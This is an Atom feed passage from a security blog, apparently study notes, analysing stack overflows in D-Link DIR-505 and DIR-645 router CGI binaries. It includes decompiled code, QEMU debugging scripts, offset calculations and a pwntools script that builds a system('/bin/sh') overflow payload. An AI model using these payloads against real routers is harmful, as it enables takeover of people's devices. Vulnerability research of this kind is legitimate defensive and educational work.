<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lantern&#39;s 小站</title>
  
  
  <link href="http://lantern.cool/atom.xml" rel="self"/>
  
  <link href="http://lantern.cool/"/>
  <updated>2021-11-09T17:44:37.000Z</updated>
  <id>http://lantern.cool/</id>
  
  <author>
    <name>Lantern</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>D-Link Dir-505 便携路由器越界漏洞分析</title>
    <link href="http://lantern.cool/CVE-d-link-dir-505/"/>
    <id>http://lantern.cool/CVE-d-link-dir-505/</id>
    <published>2021-11-09T17:44:35.000Z</published>
    <updated>2021-11-09T17:44:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="D-Link-Dir-505-便携路由器越界漏洞分析"><a href="#D-Link-Dir-505-便携路由器越界漏洞分析" class="headerlink" title="D-Link Dir-505 便携路由器越界漏洞分析"></a>D-Link Dir-505 便携路由器越界漏洞分析</h1><ul><li><a href="https://www.exploit-db.com/exploits/28184">D-Link DIR-505 1.06 - Multiple Vulnerabilities - Hardware webapps Exploit (exploit-db.com)</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://c0ug4r.top/posts/book_notes_router_0day_3/">《揭秘家用路由器0day漏洞挖掘技术》漏洞分析笔记（三） :: Cougar — Blog (c0ug4r.top)</a></p><h2 id="固件下载-amp-分离"><a href="#固件下载-amp-分离" class="headerlink" title="固件下载&amp;分离"></a>固件下载&amp;分离</h2><p><a href="https://github.com/ray-cp/MIPS/blob/master/book_note/D-Link-DIR-505_overflow/DIR505A1_FW108B10.bin">MIPS/DIR505A1_FW108B10.bin at master · ray-cp/MIPS (github.com)</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  binwalk -Me DIR505A1_FW108B10.bin</span><br><span class="line">......</span><br><span class="line">➜  squashfs-root find . |grep my_cgi.cgi</span><br><span class="line">./usr/bin/my_cgi.cgi</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root checksec ./usr/bin/my_cgi.cgi</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>IDA打开<code>/usr/bin/my_cgi.cgi</code>, 搜索字符串<code>storage_path</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109191042272.png" alt="image-20211109191042272"></p><p>根据函数名,我们不妨看看<code>get_input_entries</code></p><p>根据书上的结构及IDA反编译结果，我们可以创建如下结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> entries         struc  # (<span class="keyword">sizeof</span>=<span class="number">0x425</span>, mappedto_17)</span><br><span class="line"><span class="number">00000000</span> name:           .byte <span class="number">36</span> dup(?)</span><br><span class="line"><span class="number">00000024</span> value:          .byte <span class="number">1025</span> dup(?)</span><br><span class="line"><span class="number">00000425</span> entries         ends</span><br></pre></td></tr></table></figure><p>从而对该函数进行分析</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">get_input_entries</span><span class="params">(entries *_parameters, <span class="keyword">int</span> content_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf_count; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">int</span> auth; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">char</span> *IO_write_base; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> ch; <span class="comment">// $v1</span></span><br><span class="line">  <span class="keyword">int</span> (**v10)(FILE *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// $lo</span></span><br><span class="line">  <span class="keyword">int</span> _buf_count; <span class="comment">// $s5</span></span><br><span class="line">  entries *parameters; <span class="comment">// $s1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">1024</span>]; <span class="comment">// [sp+18h] [-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf_count = <span class="number">0</span>;</span><br><span class="line">  k = <span class="number">0</span>;</span><br><span class="line">  auth = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( content_length &gt; <span class="number">0</span> )                  <span class="comment">// read post parameters</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">stdin</span>-&gt;_fileno )</span><br><span class="line">    &#123;</span><br><span class="line">      IO_write_base = <span class="built_in">stdin</span>-&gt;_IO_write_base;</span><br><span class="line">      v8 = IO_write_base + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( IO_write_base &lt; <span class="built_in">stdin</span>-&gt;_IO_write_end )</span><br><span class="line">      &#123;</span><br><span class="line">        ch = *IO_write_base;</span><br><span class="line">        <span class="built_in">stdin</span>-&gt;_IO_write_base = v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = (<span class="keyword">int</span> (**)(FILE *))&amp;_fgetc_unlocked;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = &amp;fgetc;</span><br><span class="line">    &#125;</span><br><span class="line">    ch = ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))v10)();                <span class="comment">// get one char</span></span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="keyword">if</span> ( ch == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      count = buf_count;</span><br><span class="line">      <span class="keyword">if</span> ( !auth )</span><br><span class="line">      &#123;</span><br><span class="line">        k = <span class="number">0</span>;</span><br><span class="line">        auth = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      auth = <span class="number">1</span>;                                 <span class="comment">// WRITE_VALUE</span></span><br><span class="line">      _parameters[count].value[k] = ch;         <span class="comment">// get value</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ch == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++buf_count;</span><br><span class="line">      k = <span class="number">0</span>;</span><br><span class="line">      auth = <span class="number">0</span>;                                 <span class="comment">// WRITE_NAME</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    &#125;</span><br><span class="line">    count = buf_count;</span><br><span class="line">    <span class="keyword">if</span> ( auth )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    _parameters[count].name[k] = ch;            <span class="comment">// get name</span></span><br><span class="line">LABEL_16:</span><br><span class="line">    ++k;                                        <span class="comment">// name/value count</span></span><br><span class="line">LABEL_17:</span><br><span class="line">    --content_length;</span><br><span class="line">  &#125;</span><br><span class="line">  _buf_count = buf_count + <span class="number">1</span>;</span><br><span class="line">  parameters = _parameters;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(parameters-&gt;name, <span class="string">&quot;storage_path&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameters-&gt;name, <span class="string">&quot;path&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">        decode(parameters-&gt;value, path);</span><br><span class="line">        <span class="built_in">strcpy</span>(parameters-&gt;value, path);</span><br><span class="line">      &#125;</span><br><span class="line">      replace_special_char(parameters-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">    ++parameters;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; _buf_count );</span><br><span class="line">  <span class="keyword">return</span> _buf_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数看似是没有太大问题的，就是对POST中的参数进行格式化，但有一个问题是该函数没有大小限制，<code>get_input_entries</code>格式化POST参数时依赖参数中的<code>content_length</code>将HTTP中提供的POST参数中长度<code>content-length</code>的数据都格式化到堆栈上的局部变量<code>_parameters</code>中, 若<code>content_lenth</code>长度大于<code>buf</code>就可能造成溢出</p><p>查看交叉引用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109194541599.png" alt="image-20211109194541599"></p><p>可以定位到如下调用关系</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">entries my_entries[<span class="number">450</span>];</span><br><span class="line">......</span><br><span class="line">CONTENT_LENGTH = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( CONTENT_LENGTH )</span><br><span class="line">  content_length = strtol(CONTENT_LENGTH, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"> ......</span><br><span class="line"> <span class="built_in">memset</span>(my_entries, <span class="number">0</span>, <span class="keyword">sizeof</span>(my_entries));</span><br><span class="line"> input_entries = get_input_entries(my_entries, content_length);</span><br></pre></td></tr></table></figure><p>从调用<code>get_input_entries</code>函数附近的伪代码，可以看出，<code>content_length</code>来自<code>HTTP</code>协议的<code>content-length</code>字段，而结构体<code>my_entries</code>指向<code>栈</code>，大小为<code>450 * 0x425 = 477450 bytes</code>, 因此调用者和被调用者都没有对传入的数据进行长度限制，可以造成溢出</p><p>在这里，我们需要伪造<code>storage_path=xx</code>, 使得函数不会调用<code>replace_special_char()</code>或<code>decode()</code>对参数进行解码</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -c -l 600 -f offset</span><br><span class="line">[*] Create pattern string contains 600 characters ok!</span><br><span class="line">[+] output to offset ok!</span><br><span class="line">[+] take time: 0.0014 s</span><br></pre></td></tr></table></figure><p>调试脚本<code>run_cgi.sh</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo ./run_cgi.sh</span></span><br><span class="line">INPUT=`python3 -c <span class="string">&quot;print(&#x27;storage_path=&#x27;+&#x27;A&#x27;*477450+open(&#x27;offset&#x27;,&#x27;r&#x27;).read())&quot;</span>`</span><br><span class="line">LEN=$(<span class="built_in">echo</span> <span class="variable">$&#123;#INPUT&#125;</span>)</span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-mips-static) ./qemu</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | chroot . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;manultipart/form-data&quot;</span> -E SCRIPT_NAME=<span class="string">&quot;common&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E REQUEST_URI=<span class="string">&quot;/my_cgi.cgi&quot;</span> -g <span class="variable">$PORT</span> /usr/bin/my_cgi.cgi 2&gt;/dev/null</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>这里需要注意的是:</p><ul><li><p><code>CONTENT_TYPE</code>不能是<code>multipart/form-data</code></p><ul><li><p>在main函数前面有如下函数，如果<code>CONTENT_TYPE</code>为<code>multipart/form-data</code>, 会直接<code>return 0</code></p></li><li><p>```c<br>  CONTENT_TYPE = getenv(“CONTENT_TYPE”);<br>  ……<br>if ( CONTENT_TYPE &amp;&amp; strstr(CONTENT_TYPE, “multipart/form-data”) )<br>  {</p><pre><code>.......goto LABEL_152;......goto LABEL_170;</code></pre><p>  }<br>LABEL_152:</p><pre><code>        v41 = &quot;back&quot;;</code></pre><p>LABEL_170:</p><pre><code>        ((void (__fastcall *)(const char *))v19)(v41);        return 0;</code></pre><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `SCRIPT_NAME`不能是`HNAP1`</span><br><span class="line"></span><br><span class="line">  - 在main函数前面有如下函数，如果`SCRIPT_NAME`为`HNAP1`, 会直接`return 0`</span><br><span class="line"></span><br><span class="line">  - ```c</span><br><span class="line">     SCRIPT_NAME_1 = getenv(&quot;SCRIPT_NAME&quot;);</span><br><span class="line">      if ( !SCRIPT_NAME_1 )</span><br><span class="line">        return 0;</span><br><span class="line">    if ( strstr(SCRIPT_NAME_1, &quot;HNAP1&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        system(&quot;killall widgetd &gt; /dev/null&quot;);</span><br><span class="line">        v4 = do_hnap();</span><br><span class="line">        if ( v4 == 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          save_entry_to_flash(HIBYTE(which_mode), 0);</span><br><span class="line">          write_lighttpd_404_redirect_info();</span><br><span class="line">          system(&quot;killall -SIGSYS lighttpd&quot;);</span><br><span class="line">          system(&quot;widgetd &amp; &gt; /dev/null&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( v4 == 2 )</span><br><span class="line">        &#123;</span><br><span class="line">          system(&quot;hnap_reboot &amp;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>调试起来后：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109203005985.png" alt="image-20211109203005985"></p><p>计算偏移</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x61374161 -l 600</span><br><span class="line">[*] Create pattern string contains 600 characters ok!</span><br><span class="line">[*] Exact match at offset 22</span><br><span class="line">[+] take time: 0.0002 s</span><br></pre></td></tr></table></figure><p>则总偏移为<code>padding = 477450 + 22 = 477472</code></p><h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><p>书上利用文件存在的<code>system</code>函数进行构造，在函数窗口中进行搜索</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109204903550.png" alt="image-20211109204903550"></p><p>查找交叉引用，在<code>get_remote_mac + CC</code>处，找到如下指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00405B1C                 la      $t9, system</span><br><span class="line">.text:00405B20                 li      $s1, 0x440000</span><br><span class="line">.text:00405B24                 jalr    $t9 ; system</span><br><span class="line">.text:00405B28                 addiu   $a0, $sp, 0x28  # &#x27;(&#x27;  # command</span><br><span class="line">.text:00405B2C                 lw      $gp, 0x18($sp)</span><br></pre></td></tr></table></figure><p>这里调用了<code>system(command)</code>函数，且参数<code>command</code>布置在<code>$sp + 0x28</code>处即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">477472</span></span><br><span class="line">system_addr = <span class="number">0x0405B1C</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset</span><br><span class="line">payload += <span class="string">b&quot;\x00\x40\x5B\x1C&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exploit&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> exploit:</span><br><span class="line">    exploit.write(payload)</span><br><span class="line">    log.success(<span class="string">&quot;Create Exploit Success&quot;</span>)</span><br></pre></td></tr></table></figure><p>书里到这里就结束了，但在本地调试（非实机）的利用中发现，由于没有开启地址随机化，<code>0x405B1C</code>会导致存在<code>0x00</code>字节</p><p><strong>exploit:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109213815398.png" alt="image-20211109213815398"></p><p><strong>IDA调试:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211109213709223.png" alt="image-20211109213709223"></p>]]></content>
    
    
    <summary type="html">D-Link Dir-505 便携路由器越界漏洞分析</summary>
    
    
    
    <category term="CVE" scheme="http://lantern.cool/categories/CVE/"/>
    
    
    <category term="CVE" scheme="http://lantern.cool/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>D-Link Dir-645 路由器溢出漏洞分析</title>
    <link href="http://lantern.cool/CVE-d-link-dir-645/"/>
    <id>http://lantern.cool/CVE-d-link-dir-645/</id>
    <published>2021-11-08T17:44:35.000Z</published>
    <updated>2021-11-08T17:44:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="D-Link-Dir-645-路由器溢出漏洞分析"><a href="#D-Link-Dir-645-路由器溢出漏洞分析" class="headerlink" title="D-Link Dir-645 路由器溢出漏洞分析"></a>D-Link Dir-645 路由器溢出漏洞分析</h1><ul><li><a href="https://www.exploit-db.com/exploits/33862">D-Link Devices - ‘Authentication.cgi’ Remote Buffer Overflow (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://c0ug4r.top/posts/book_notes_router_0day_2/">《揭秘家用路由器0day漏洞挖掘技术》漏洞分析笔记（二） :: Cougar — Blog (c0ug4r.top)</a></p><p><a href="http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt">roberto.greyhats.it/advisories/20130801-dlink-dir645.txt</a></p><h2 id="固件下载-amp-分离"><a href="#固件下载-amp-分离" class="headerlink" title="固件下载&amp;分离"></a>固件下载&amp;分离</h2><p>固件版本<strong>DIR645A1_FW103B11</strong></p><p>下载地址: <a href="http://files.dlink.com.au/products/DIR-645/REV_A/Firmware/DIR645_FW103B11/DIR645A1_FW103B11.zip">http://files.dlink.com.au/products/DIR-645/REV_A/Firmware/DIR645_FW103B11/DIR645A1_FW103B11.zip</a></p><p><strong>分离固件</strong>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  11 binwalk -e DIR645A1_FW103B11.bin</span><br><span class="line">.....</span><br><span class="line">➜  _DIR645A1_FW103B11.bin.extracted ls squashfs-root</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞是CGI脚本在处理<code>authentication.cgi</code>请求，来读取POST参数中的”password”参数的值时造成的缓冲区溢出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root find . |grep authentication.cgi</span><br><span class="line">./htdocs/web/authentication.cgi</span><br><span class="line">./htdocs/web/webfa_authentication.cgi</span><br></pre></td></tr></table></figure><p>而<code>authentication.cgi -&gt; /htdocs/cgibin</code></p><p>根据漏洞描述可以找到<code>authenticationcgi_main</code>函数，从而进行分析</p><p>首先是区分不同的操作，<code>authentication.cgi =&gt; 0</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">REQUEST_METHOD = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line"> <span class="built_in">memset</span>(v60, <span class="number">0</span>, <span class="keyword">sizeof</span>(v60));</span><br><span class="line"> <span class="built_in">memset</span>(v66, <span class="number">0</span>, <span class="keyword">sizeof</span>(v66));</span><br><span class="line"> <span class="built_in">memset</span>(v57, <span class="number">0</span>, <span class="keyword">sizeof</span>(v57));</span><br><span class="line"> auth = divide_authentication(*argv);          <span class="comment">// /htdocs/web/authentication.cgi =&gt; 0</span></span><br><span class="line">                                               <span class="comment">// /htdocs/web/authentication_logout.cgi =&gt; 1</span></span><br><span class="line">                                               <span class="comment">// /htdocs/web/webfa_authentication.cgi =&gt; 2</span></span><br><span class="line">                                               <span class="comment">// /htdocs/web/webfa_authentication_logout.cgi =&gt;3</span></span><br></pre></td></tr></table></figure><p>接着判断<code>REQUEST_METHOD</code>是否为<code>GET</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// authentication.cgi:120</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_METHOD, <span class="string">&quot;GET&quot;</span>) )         <span class="comment">// REQUEST_METHOD == GET</span></span><br></pre></td></tr></table></figure><p>判断<code>REQUEST_METHOD</code>是否为<code>GET</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// authentication.cgi:175</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(REQUEST_METHOD, <span class="string">&quot;POST&quot;</span>) )         <span class="comment">// REQUEST_METHOD == POST</span></span><br></pre></td></tr></table></figure><p>在POST方法中，读取内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( !CONTENT_TYPE</span><br><span class="line">    || !CONTENT_LENGTH</span><br><span class="line">    || (CONTENT_LENGTH_INT = atoi(CONTENT_LENGTH), IO = fileno(<span class="built_in">stdin</span>), read(IO, CONTENT_BUF, CONTENT_LENGTH_INT) &lt; <span class="number">0</span>)</span><br><span class="line">    || (CONTENT_BUF[CONTENT_LENGTH_INT] = <span class="number">0</span>, Get_HTTP_COOKIE((<span class="keyword">int</span>)v66) &lt; <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_51:</span><br><span class="line">    v9 = <span class="number">5</span>;                                     <span class="comment">// &#123;\&quot;RESULT\&quot;: \&quot;FAIL\&quot;, \&quot;REASON\&quot;: \&quot;ERR_GET_UENTRY\&quot;&#125;</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_96;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，<code>CONTENT_LENGTH_INT</code>来自我们传入的内容而非系统指定, 则<code>read(IO, CONTENT_BUF, CONTENT_LENGTH_INT)</code>可能造成溢出</p><p><code>LABEL_96</code>处进行返回包内容的判断，v9等于<code>&#123;\&quot;RESULT\&quot;: \&quot;FAIL\&quot;, \&quot;REASON\&quot;: \&quot;ERR_GET_UENTRY\&quot;&#125;</code></p><p>接着对CONTENT_BUF的内容进行判读，判断是否存在<code>id=</code>或<code>password=</code>，存在则进行读取</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">haystack = CONTENT_BUF;</span><br><span class="line">  dest = (<span class="keyword">char</span> *)v66;</span><br><span class="line">  point2id_password = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;::point2id_password;<span class="comment">// id=</span></span><br><span class="line">                                                <span class="comment">// password=</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = *point2id_password;</span><br><span class="line">    v25 = <span class="built_in">strstr</span>(haystack, *point2id_password);</span><br><span class="line">    v26 = &amp;v25[<span class="built_in">strlen</span>(v24)];</span><br><span class="line">    v27 = v26;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )                                 <span class="comment">// read until &#x27;&amp;&#x27; or &#x27;\x00&#x27;</span></span><br><span class="line">    &#123;</span><br><span class="line">      v28 = *v27;</span><br><span class="line">      <span class="keyword">if</span> ( v28 == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v27;</span><br><span class="line">      <span class="keyword">if</span> ( !v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        --v27;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v29 = v27 - v26;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;v66[<span class="number">32</span>], v26, v27 - v26);<span class="comment">// read password</span></span><br><span class="line">      *((_BYTE *)&amp;v66[<span class="number">32</span>] + v29) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, v26, v27 - v26);            <span class="comment">// read id</span></span><br><span class="line">      *((_BYTE *)v66 + v29) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++point2id_password;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到<code>strncpy</code>出<code>27 - 26</code>这个长度实际也是可以控制进行溢出的， 但从<code>v66</code>溢出到<code>$ra</code>太远，可能影响其他寄存器导致程序奔溃</p><p>从上我们可以根据分析得到如下攻击思路</p><ul><li>通过发送POST包超长CONTENT使得溢出</li></ul><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>根据上述漏洞分析，我们首先需要确定偏移量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -c -l 1160 -f offset</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[+] output to offset ok!</span><br><span class="line">[+] take time: 0.0016 s</span><br></pre></td></tr></table></figure><ul><li>使用 2000，发现会覆盖<code>$a1</code>后导致程序崩溃，于是减少长度到 1160</li></ul><p>调试脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># user-mode-debug.sh</span></span><br><span class="line"><span class="comment"># sudo ./user-mode-debug.sh `python -c &quot;print &#x27;uid=test&amp;password=&#x27; + open(&#x27;offsetest&#x27;,&#x27;r&#x27;).read(1160)&quot;`</span></span><br><span class="line"></span><br><span class="line">INPUT=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span> <span class="comment"># ida debugger default port</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | wc -c)</span><br><span class="line">cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | chroot ./ ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E REQUEST_URI=<span class="string">&quot;/authentication.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> -g <span class="variable">$PORT</span> /htdocs/web/authentication.cgi</span><br><span class="line">rm -rf ./qemu</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211108173250341.png" alt="image-20211108173250341"></p><p>计算得偏移为<code>1050</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x42316A42 -l 1160</span><br><span class="line">[*] Create pattern string contains 1160 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 1053 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0003 s</span><br></pre></td></tr></table></figure><p>且栈布局为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding:1014</span><br><span class="line">$s0~$s7</span><br><span class="line">$fp</span><br><span class="line">$ra</span><br></pre></td></tr></table></figure><h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><p>与<a href="https://lantern.cool/CVE-d-link-dir-815/">D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a>相同</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>该固件多个地方存在漏洞，详情查看<a 